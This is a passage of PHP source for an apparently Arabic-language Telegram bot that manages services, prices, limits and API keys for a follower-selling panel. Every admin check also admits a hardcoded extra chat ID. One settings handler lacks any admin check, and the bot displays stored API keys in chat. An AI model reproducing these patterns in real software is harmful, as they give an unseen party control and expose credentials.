	$sitecon = $rshq['Web'][explode("|", $data)[1]][explode("|", $data)[2]] ?? $rshq["sSite"];
    $s3r = $rshq['S3RS'][explode("|", $data)[1]][explode("|", $data)[2]];
    $web = ($rshq['Web'][explode("|", $data)[1]][explode("|", $data)[2]] ?? $rshq["sSite"]);
    $s3r = ($s3r ?? "1");
    $key = ($rshq['key'][explode("|", $data)[1]][explode("|", $data)[2]] ?? $rshq["sToken"]);
    $mix = ($rshq['mix'][explode("|", $data)[1]][explode("|", $data)[2]] ?? "1000");
    $min = ($rshq['min'][explode("|", $data)[1]][explode("|", $data)[2]] ?? "100");
    $ifd = "$min - $mix";
    $idxdam = $rshq['IDSSS'][explode("|", $data)[1]][explode("|", $data)[2]] ?? "لا يوجد";
    $Apikey = $rshq['key'][explode("|", $data)[1]][explode("|", $data)[2]] ?? "لا يوجد";
   
   $rsedi = json_decode(file_get_contents("https://".$sitecon."/api/v2?key=$Apikey&action=balance"));
$flos = $rsedi->balance; 
$treqa = $rsedi->currency; 
    if ($rshq["sSite"] != null) {
        $dom = "ربط الخدمه على الموقع الأساسي (" . $rshq["sSite"] . ") ";
    }
    $key = ['inline_keyboard' => []];
    $key['inline_keyboard'][] = [['text' => "$dom", 'callback_data' => "setauto|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين سعر الخدمه", 'callback_data' => "setprice|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين ايدي الخدمه", 'callback_data' => "setid|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين ادنى حد للخدمه", 'callback_data' => "setmin|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين اقصى حد للخدمه", 'callback_data' => "setmix|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين ربط الموقع", 'callback_data' => "setWeb|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين وصف الخدمه", 'callback_data' => "setabb|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين كليشه الارسال", 'callback_data' => "setklisja|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "تعيين API KEY الموقع للخدمه", 'callback_data' => "setkey|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "امسح الخدمه", 'callback_data' => "delt|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    $key['inline_keyboard'][] = [['text' => "🔃 تحديث القائمه", 'callback_data' => "editss|" . explode("|", $data)[1] . "|" . explode("|", $data)[2]]];
    
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "edits|".explode("|", $data)[1]]];

    

    bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*
    هنا خدمه " . $rshq['xdmaxs'][explode("|", $data)[1]][explode("|", $data)[2]] . " في قسم " . $rshq['NAMES'][explode("|", $data)[1]] . "
    يمكنك التحكم الكامل بلخدمات هنا ؟
    *
   
      - سعر الخدمه الحالي : *$s3r*
   - ايدي الخدمه الحالي : `$idxdam`
   - ادني حد - اقصي حد : *$ifd*
   - ربط الخدمه مربوط بموقع : ($sitecon)
   - مفتاح الموقع : `$Apikey`
   - رصيدك في الموقع : *$flos*
    ",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode($key),
    ]);
    $modes['mode'][$from_id] = null;
    SETJSON($rshq);
    SETJSON12($modes);
}

if(explode("|",$data)[0]=="delt"){
  unset($rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]]);
  $modes['mode'][$from_id] = null;
  $rshq['idTIMER'][$vv] = $rshq['NAMES'][explode("|",$data)[1]];
  SETJSON($rshq); SETJSON12($modes);

  $key = ['inline_keyboard' => []];
  $vv = rand(100,900);

  foreach ( $rshq['xdmaxs'][explode("|",$data)[1]] as $hjjj => $i) {

    $key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|".explode("|",$data)[1]."|$hjjj"], ['text' => "🗑", 'callback_data' => "delt|".explode("|",$data)[1]."|$hjjj"]];
  }

  $bbERO = explode("|",$data)[1];
  $key['inline_keyboard'][] = [['text' => "+ اضافه خدمات الي هذا القسم", 'callback_data' => "add|$bbERO"]];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
    *
    
    الخدمات الموجوده في قسم *".$rshq['NAMES'][explode("|",$data)[1]]."*
    *
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);

}

$name_xadm = $rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]];
$name_qsm = $rshq['NAMES'][explode("|",$data)[1]];
$xcmp = "editss|".explode("|", $data)[1]."|".explode("|", $data)[2]."";
$jn[1] = explode("|",$rshq['MGS'][$from_id])[1];
$jn[2] = explode("|",$rshq['MGS'][$from_id])[2];
$xcdp = "editss|".$jn[1]."|".$jn[2]."";
$backers = ['inline_keyboard' => []];

$backers['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcdp"]];
$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);
if(explode("|",$data)[0]=="setprice"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( سعر الخدمه ) 
~ أرسل الأن سعر الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setprice";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if(explode("|",$data)[0]=="setauto"){

  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ تم ربط الخدمه بنجاح علي الموقع الأساسي .
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = null;
  $rshq['Web'][explode("|",$data)[1]][explode("|",$data)[2]] = $rshq["sSite"]  ;
  $rshq['key'][explode("|",$data)[1]][explode("|",$data)[2]] = $rshq["sToken"]  ;
  SETJSON($rshq); SETJSON12($modes);
}



if(explode("|",$data)[0]=="setmin"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( أدني حد الخدمه ) 
~ أرسل الأن ادنى حد الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setmin";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if(is_numeric($text) and $modes['mode'][$from_id] == "setmin"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bA = $text / 1000;
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين ادني حد *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['min'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text ;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setabb"){
	$mix = ($rshq['mix'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "1000");
        $min = ($rshq['min'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "100");
	$abb1 = "
	👮🏽] اسم الخدمة : [".$rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]]."]

💰] السعر : ". $g ." نقطة لكل 1000

📊] الحد الادني للرشق : $min
🎟️] الحد الاقصي للرشق : $mix

🦾] ارسل الكمية التي تريد طلبها : 
	" ;

  if($rshq['wsfer'][explode("|",$data)[1]][explode("|",$data)[2]] == null){
    $abb = $abb1;
  }else{
    $abb = $rshq['wsfer'][explode("|",$data)[1]][explode("|",$data)[2]];
  }
	$abb = $rshq['wsfer'][explode("|",$data)[1]][explode("|",$data)[2]]?? $abb;
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( وصف الخدمه ) 
~ أرسل الأن وصف الخدمه :

*الوصف الحالي :-*

$abb
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setabb";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if($text and $modes['mode'][$from_id] == "setabb"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bA = $text / 1000;
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين الوصف *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['wsfer'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text ;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setklisja"){
	$mix = ($rshq['mix'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "1000");
        $min = ($rshq['min'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "100");
      
	$abb = "
	• ارسل الرابط الخاص بك 📥 :
	" ;
  
	$abb = $rshq['klishs'][explode("|",$data)[1]][explode("|",$data)[2]]?? $abb;
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( كليشه ألأرسال الخدمه ) 
~ أرسل الأن الكليشه الخدمه :

*الكليشه الحاليه :-*

$abb
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setklisja";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if($text and $modes['mode'][$from_id] == "setklisja"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bA = $text / 1000;
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين الكلشه *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['klishs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text ;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setkey"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( API_KEY الخدمه ) 
~ أرسل الأن مفتاح API الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setkey";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}
$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);

if($text and $modes['mode'][$from_id] == "setkey"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bA = $text / 1000;
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين API KEY *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['key'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text ;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setmix"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( اقصى حد الخدمه ) 
~ أرسل الأن اقصى حد الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setmix";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if(is_numeric($text) and $modes['mode'][$from_id] == "setmix"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
   
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين اقصي حد *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['mix'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text ;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}


if(is_numeric($text) and $modes['mode'][$from_id] == "setprice"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bA = $text / 1000;
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين سعر *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['S3RS'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $bA;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setWeb"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( رابط موقع الخدمه ) 
~ أرسل الأن رابط موقع الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setWeb";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if($text and $modes['mode'][$from_id] == "setWeb"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
$IMBERO = parse_url($text);
$INBERO = $IMBERO['host'];

    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين ربط موقع *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['Web'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $INBERO;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setdes"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
    *
    هنا خدمه ".$rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]]." في قسم ".$rshq['NAMES'][explode("|",$data)[1]]."
    ارسل وصف الخدمه الان؟
    *
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = "setdes";
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if($text and $modes['mode'][$from_id] == "setdes"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين وصف ر *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['WSF'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

if(explode("|",$data)[0]=="setid"){
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "$xcmp"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
- عزيزي المطور اهلا بك في خدمه *$name_xadm* داخل اقسام *$name_qsm*
~ في وضع ( ايدي الخدمه ) 
~ أرسل الأن ايدي الخدمه الخدمه :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = explode("|",$data)[0];
  $rshq['MGS'][$from_id] = "MGS|".explode("|",$data)[1]."|".explode("|",$data)[2];
  SETJSON($rshq); SETJSON12($modes);
}

if(is_numeric($text) and $modes['mode'][$from_id] == "setid"){
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    
    bot("sendmessage",[
      "chat_id" => $chat_id,
      "text" => "
      تم تعيين ايدي خدمه ر *". $rshq['xdmaxs'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]]."* في قسم *".$rshq['NAMES'][explode("|",$rshq['MGS'][$from_id])[1]]."*
      ",
      "parse_mode"=>"markdown",
      'reply_markup' => json_encode($backers),
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['IDSSS'][explode("|",$rshq['MGS'][$from_id])[1]][explode("|",$rshq['MGS'][$from_id])[2]] = $text;
    $rshq['MGS'][$from_id] = null;
    SETJSON($rshq); SETJSON12($modes);
  }
}

  if ($data == "addqsm") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "
        *
        ارسل اسم القسم الان مثلا خدمات انستاكرام
        *
        ",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
          'inline_keyboard' => [
            [['text' => 'رجوع', 'callback_data' => "xdmat"]],
          ]
        ])
      ]);
      $modes['mode'][$from_id] = $data;
      $rshq = json_encode($rshq, 32 | 128 | 265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
    }
  }
  
  if ($text and $modes["mode"][$from_id] == "addqsm") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      $bbERO = "BERO" . rand(0, 999999999999999);
      bot("sendmessage", [
        "chat_id" => $chat_id,
        "text" => "
تم إضافة هذا القسم بنجاح. 🎉
- اسم القسم: $text
- كود القسم: $bbERO

شكرًا لتحسيناتك القيمة! 🚀
        ",
        "parse_mode" => "markdown",
        'reply_markup' => json_encode([
          'inline_keyboard' => [
            [['text' => 'للدخول لهذا القسم', 'callback_data' => "CHANGE|$bbERO"]],
          ]
        ])
      ]);
      $rshq['qsm'][] = $text . '-' . $bbERO;
      $rshq['NAMES'][$bbERO] = $text;
      $modes['mode'][$from_id] = null;
      $rshq = json_encode($rshq, 32 | 128 | 265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
    }
  }
  
  $UUS = explode("|", $data);
  if ($UUS[0] == "CHANGE") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      $bbERO = $UUS[1];
      if ($rshq['NAMES'][$bbERO] != null) {
        $key = ['inline_keyboard' => []];
        foreach ($rshq['xdmaxs'][$bbERO] as $i) {
          $name = $rshq['nam'][$i];
          $ids = $rshq['ids'][$i];
          $key['inline_keyboard'][] = [['text' => "$name", 'callback_data' => "edits:$i"], ['text' => "🗑", 'callback_data' => "edits:$i"]];
        }
        $key['inline_keyboard'][] = [['text' => "+ أضافه خدمه يدويه", 'callback_data' => "add|$bbERO"]];
        $key['inline_keyboard'][] = [['text' => "قسم الاضافه السريعه [ تلقائي ]", 'callback_data' => "addauto|$bbERO"]];
        $key['inline_keyboard'][] = [['text' => "مسح هذا القسم", 'callback_data' => "delets|$bbERO"]];
        bot('EditMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $message_id,
          'text' => "
          *
          مرحبا بك في هذا القسم " . $rshq['NAMES'][$bbERO] . "
          *
          ",
          'parse_mode' => "markdown",
          'reply_markup' => json_encode($key),
        ]);
      }
    }
  }

  if($UUS[0]=="add"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      bot('EditMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "
        *
        ارسل اسم الخدمه لاضافاتها الي قسم ".$bbERO."
        *
        ",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
          'inline_keyboard' => [
            [['text' => 'رجوع', 'callback_data' => "xdmat"]],
          ]
        ])
      ]);
      $modes['mode'][$from_id] = "adders"; 
      $rshq['idxs'][$from_id] = $UUS[1];
      $rshq = json_encode($rshq, 32 | 128 | 265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
    }
  }

if($text and $modes['mode'][$from_id] == "adders"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    $bbERO = $rshq['idxs'][$from_id];
    $bsf = rand(33,33333);
    $j=1;
    foreach ( $rshq['xdmaxs'][$bbERO] as $hjjj => $i) {
$j+=1;
    }
    bot("sendmessaGE",[
      "chat_id" => $chat_id,
      "text" => "
      تم اضافه هذا الخدمه الي قسم *".$rshq['NAMES'][$bbERO]."*
      ",
      "parse_mode" => "markdown",
      'reply_markup' => json_encode([
        'inline_keyboard' => [
          [['text' => 'دخول الي الخدمه', 'callback_data' => "editss|".$bbERO."|$hjjj"]],
          [['text' => 'رجوع', 'callback_data' => "xdmat"]],
        ]
      ])
    ]);
    $modes['mode'][$from_id] = null;
    $rshq['idxs'][$from_id] = null;
    $rshq['xdmaxs'][$bbERO][] = $text;
    $rshq= json_encode($rshq,32|128|265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);

if($data == "onhdia"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot("deletemessage",[
      'chat_id' => $chat_id,
      'message_id' => $message_id,
    ]);
    bot('sendmessage',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
     تم تفعيل الهديه اليوميه .
      *
      
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
      ]);

      $rshq['HDIA']  = "on";
      $rshq= json_encode($rshq,32|128|265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if($data == "ofhdia"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot("deletemessage",[
      'chat_id' => $chat_id,
      'message_id' => $message_id,
    ]);
    bot('sendmessage',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
     تم تعطيل الهديه اليوميه .
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
      ]);

      $rshq['HDIA']  = "of";
      $rshq= json_encode($rshq,32|128|265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
}

if($data == "sAKTHAR"){
if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
  bot('EditMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
    *
   ارسل الان العدد ( ادني حد لتحويل ال$name3mla (
    *
    
    ",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
    'inline_keyboard'=>[
         [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
    ]
    ])
    ]);
    $modes['mode'][$from_id]  = $data;
    $rshq= json_encode($rshq,32|128|265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}
}

if($text and $modes['mode'][$from_id] == "sAKTHAR"){
if(is_numeric($text)){
  bot("sendmessage",[
    'chat_id'=>$chat_id,
    'text'=>"تم التعيين بنجاح ادني حد للتحويل هو *$text*",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
  ]);
  $rshq['AKTHAR']  = $text;
  $modes['mode'][$from_id]  = null;
  $rshq= json_encode($rshq,32|128|265);
  file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}else{
  bot("sendmessage",[
    'chat_id'=>$chat_id,
    'text'=>"ارسل *الارقام* فقط عزيزي",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
  ]);

}
}

if($data == "setphone"){
  if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
